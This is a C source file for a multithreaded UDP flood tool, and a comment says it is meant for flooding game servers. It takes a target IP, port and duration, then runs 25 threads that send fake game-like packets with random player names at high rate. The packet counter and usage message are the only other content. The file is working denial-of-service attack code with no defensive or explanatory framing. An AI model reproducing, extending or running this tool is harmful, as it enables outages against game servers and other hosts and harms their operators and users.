#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>

#define PACKET_SIZE 1024
#define MAX_PACKETS_PER_SEC 10000
#define NAME_LENGTH 10
#define NUM_THREADS 25 // 25 threads for game server flooding

struct flood_args {
    const char *target_ip;
    int target_port;
    int duration;
    unsigned long *packets_sent; // Shared counter
    pthread_mutex_t *mutex;      // For thread-safe counter updates
};

int create_socket() {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        return -1;
    }
    
    int sendbuf = 1024 * 1024;
    if (setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf)) < 0) {
        perror("Warning: Failed to set send buffer size");
    }
    
    return sock;
}

char *generate_random_name(int length) {
    static const char letters[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    char *name = malloc(length + 1);
    if (!name) return NULL;
    
    for (int i = 0; i < length; i++) {
        name[i] = letters[rand() % (sizeof(letters) - 1)];
    }
    name[length] = '\0';
    return name;
}

void *thread_flood(void *arg) {
    struct flood_args *args = (struct flood_args *)arg;
    int sock = create_socket();
    if (sock < 0) {
        pthread_exit(NULL);
    }

    // Seed RNG per thread for better randomness
    srand(time(NULL) + (unsigned int)pthread_self());

    struct sockaddr_in target = {0};
    target.sin_family = AF_INET;
    target.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &target.sin_addr);

    char packet[PACKET_SIZE];
    time_t start_time = time(NULL);

    while (time(NULL) - start_time < args->duration) {
        // Adjust packet rate per thread for 25 threads
        for (int i = 0; i < MAX_PACKETS_PER_SEC / NUM_THREADS; i++) {
            char *name = generate_random_name(NAME_LENGTH);
            if (!name) continue;
            
            // Simulate game-like packet with random data
            snprintf(packet, PACKET_SIZE, "Player: %s - GameData: %d", 
                    name, rand() % 1000);
            free(name);
            
            ssize_t sent = sendto(sock, packet, strlen(packet), 0,
                                 (struct sockaddr *)&target, sizeof(target));
            if (sent > 0) {
                pthread_mutex_lock(args->mutex);
                (*args->packets_sent)++;
                pthread_mutex_unlock(args->mutex);
            } else if (sent < 0) {
                fprintf(stderr, "Thread %lu send failed: %s\n", 
                       (unsigned long)pthread_self(), strerror(errno));
            }
        }
        usleep(500); // 0.5ms sleep to simulate game packet spacing
    }
    
    close(sock);
    pthread_exit(NULL);
}

int udp_flood(const char *target_ip, int target_port, int duration) {
    pthread_t threads[NUM_THREADS];
    struct flood_args args;
    unsigned long packets_sent = 0;
    pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

    args.target_ip = target_ip;
    args.target_port = target_port;
    args.duration = duration;
    args.packets_sent = &packets_sent;
    args.mutex = &mutex;

    // Create 25 threads
    for (int i = 0; i < NUM_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, thread_flood, &args) != 0) {
            perror("Thread creation failed");
            return -1;
        }
    }

    // Progress reporting
    time_t start_time = time(NULL);
    while (time(NULL) - start_time < duration) {
        sleep(1); // Update every second
        pthread_mutex_lock(&mutex);
        printf("\rPackets sent: %lu (%.1f packets/sec)", 
               packets_sent, (float)packets_sent / (time(NULL) - start_time));
        fflush(stdout);
        pthread_mutex_unlock(&mutex);
    }

    // Join threads
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    pthread_mutex_destroy(&mutex);
    printf("\nFlood completed. Total packets sent: %lu\n", packets_sent);
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <IP> <Port> <Time>\n", argv[0]);
        return EXIT_FAILURE;
    }
    
    srand(time(NULL));
    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    
    if (target_port <= 0 || target_port > 65535) {
        fprintf(stderr, "Port must be between 1 and 65535\n");
        return EXIT_FAILURE;
    }
    if (duration <= 0) {
        fprintf(stderr, "Duration must be positive\n");
        return EXIT_FAILURE;
    }
    
    printf("Starting UDP flood on %s:%d for %d seconds with %d threads\n", 
           target_ip, target_port, duration, NUM_THREADS);
    
    if (udp_flood(target_ip, target_port, duration) < 0) {
        return EXIT_FAILURE;
    }
    
    return EXIT_SUCCESS;
}